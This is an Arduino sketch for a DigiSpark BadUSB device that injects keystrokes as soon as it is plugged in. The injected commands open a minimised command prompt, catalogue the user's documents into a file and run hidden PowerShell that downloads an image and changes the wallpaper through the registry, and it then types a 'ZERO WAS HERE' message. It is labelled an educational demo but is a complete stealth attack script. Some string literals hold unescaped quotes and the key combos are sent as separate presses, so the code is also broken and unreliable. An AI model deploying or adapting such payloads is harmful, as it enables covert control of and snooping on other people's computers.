/*
Happy Frog - DigiSpark Production Code
HID Emulation Script - Runs immediately on boot

Device: DigiSpark
Processor: ATtiny85
Framework: Arduino (DigiSpark)
Mode: Production (immediate execution)

⚠️ PRODUCTION MODE: This code runs immediately when device boots!
⚠️ Use only for authorized testing and educational purposes!
*/

#include "DigiKeyboard.h"  // DigiSpark keyboard library

void setup() {
  // Initialize DigiSpark for ultra-compact HID emulation
  // DigiSpark: No explicit initialization needed
  
  // DigiSpark: Minimal startup delay for stealth
  delay(1000);  // Compact startup delay
}

void loop() {
  // Production mode - execute payload immediately
  executePayload();
  
  // DigiSpark: Ultra-compact infinite loop for production
  while(true) {
    ;  // Empty loop to prevent re-execution
  }
}

void executePayload() {
  // Generated Happy Frog payload for DigiSpark

  // Production code - executes immediately on device boot/plug-in
  // ATTACKMODE HID STORAGE detected - running payload automatically

  // Wait for system to recognize the device
  DigiKeyboard.delay(2000);

  // DigiSpark Command: # Happy Frog Script - Converted from Ducky Script

  // DigiSpark Command: # Original source: payloads/ducky.txt

  // DigiSpark Command: # Educational conversion - review all commands before execution

  // DigiSpark Command: # BadUSB Demo: Open Terminal, Notepad, and type a message

  // DigiSpark Command: ATTACKMODE HID STORAGE
  // ATTACKMODE: Configured for HID emulation (HID STORAGE)
  // Note: This device is configured as a HID keyboard/mouse
  // Configuration: HID STORAGE

  // DigiSpark Command: DELAY 2000
  DigiKeyboard.delay(2000);  // DigiSpark delay: 2000ms

  // DigiSpark Command: # Open File Explorer

  // DigiSpark Command: MOD e
  // DigiSpark compact modifier combo
  DigiKeyboard.sendKeyPress(KEY_GUI);  // Press MOD
  DigiKeyboard.sendKeyPress(KEY_E);  // Press e

  // DigiSpark Command: DELAY 1000
  DigiKeyboard.delay(1000);  // DigiSpark delay: 1000ms

  // DigiSpark Command: # Open Hidden Command Prompt

  // DigiSpark Command: MOD r
  // DigiSpark compact modifier combo
  DigiKeyboard.sendKeyPress(KEY_GUI);  // Press MOD
  DigiKeyboard.sendKeyPress(KEY_R);  // Press r

  // DigiSpark Command: DELAY 500
  DigiKeyboard.delay(500);  // DigiSpark delay: 500ms

  // DigiSpark Command: STRING start /min cmd
  DigiKeyboard.print("start /min cmd");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: DELAY 1500
  DigiKeyboard.delay(1500);  // DigiSpark delay: 1500ms

  // DigiSpark Command: # Create "Demo" directory and files in one reliable command

  // DigiSpark Command: STRING mkdir "%USERPROFILE%\Desktop\Demo" 2>nul && echo Demo file created at %date% %time% > "%USERPROFILE%\Desktop\Demo\README.txt" && echo This is a security demonstration file. > "%USERPROFILE%\Desktop\Demo\demo.txt" && echo If you can read this, your system was accessed via HID device. > "%USERPROFILE%\Desktop\Demo\warning.txt"
  DigiKeyboard.print("mkdir "%USERPROFILE%\Desktop\Demo" 2>nul && echo Demo file created at %date% %time% > "%USERPROFILE%\Desktop\Demo\README.txt" && echo This is a security demonstration file. > "%USERPROFILE%\Desktop\Demo\demo.txt" && echo If you can read this, your system was accessed via HID device. > "%USERPROFILE%\Desktop\Demo\warning.txt"");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: DELAY 1000
  DigiKeyboard.delay(1000);  // DigiSpark delay: 1000ms

  // DigiSpark Command: # Search for common document types (globally usable)

  // DigiSpark Command: STRING for /r "%USERPROFILE%\Documents" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"
  DigiKeyboard.print("for /r "%USERPROFILE%\Documents" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: DELAY 1000
  DigiKeyboard.delay(1000);  // DigiSpark delay: 1000ms

  // DigiSpark Command: STRING for /r "%USERPROFILE%\Desktop" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"
  DigiKeyboard.print("for /r "%USERPROFILE%\Desktop" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: DELAY 1000
  DigiKeyboard.delay(1000);  // DigiSpark delay: 1000ms

  // DigiSpark Command: # Change wallpaper to hacker skull (stealth version)

  // DigiSpark Command: STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile", "-NonInteractive", "-Command", "powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\Desktop\Demo\wallpaper.jpg; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\Desktop\Demo\wallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters"" -Wait
  DigiKeyboard.print("Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile", "-NonInteractive", "-Command", "powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\Desktop\Demo\wallpaper.jpg; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\Desktop\Demo\wallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters"" -Wait");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: DELAY 3000
  DigiKeyboard.delay(3000);  // DigiSpark delay: 3000ms

  // DigiSpark Command: # Open Notepad

  // DigiSpark Command: MOD r
  // DigiSpark compact modifier combo
  DigiKeyboard.sendKeyPress(KEY_GUI);  // Press MOD
  DigiKeyboard.sendKeyPress(KEY_R);  // Press r

  // DigiSpark Command: DELAY 500
  DigiKeyboard.delay(500);  // DigiSpark delay: 500ms

  // DigiSpark Command: STRING notepad
  DigiKeyboard.print("notepad");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: DELAY 1500
  DigiKeyboard.delay(1500);  // DigiSpark delay: 1500ms

  // DigiSpark Command: # Type simple hacker message in Notepad (replacing ASCII art)

  // DigiSpark Command: STRING ZERO WAS HERE
  DigiKeyboard.print("ZERO WAS HERE");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: DELAY 500
  DigiKeyboard.delay(500);  // DigiSpark delay: 500ms

  // DigiSpark Command: STRING never trust an open machine
  DigiKeyboard.print("never trust an open machine");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: DELAY 500
  DigiKeyboard.delay(500);  // DigiSpark delay: 500ms

  // DigiSpark Command: STRING *** DEMO: Demo files have been created. This is a security demonstration. ***
  DigiKeyboard.print("*** DEMO: Demo files have been created. This is a security demonstration. ***");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: STRING To protect your data, always lock your machine and use strong passwords.
  DigiKeyboard.print("To protect your data, always lock your machine and use strong passwords.");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: STRING This was a demo. Next time, don't plug in random USB drives or borrow chargers!
  DigiKeyboard.print("This was a demo. Next time, don't plug in random USB drives or borrow chargers!");  // DigiSpark string input

  // DigiSpark Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // DigiSpark key press: ENTER

  // DigiSpark Command: # Conversion completed by Happy Frog

  // DigiSpark Command: # Remember: Use only for educational purposes and authorized testing!

  // End of Happy Frog payload
}

/*
End of Happy Frog Production Code for DigiSpark

Production Notes:
- This code runs immediately on device boot
- Optimized for ultra-compact HID emulation
- ATtiny85 processor enables portable applications
- Perfect for stealth and portable payload demonstrations

For more information, visit: https://github.com/ZeroDumb/happy-frog
*/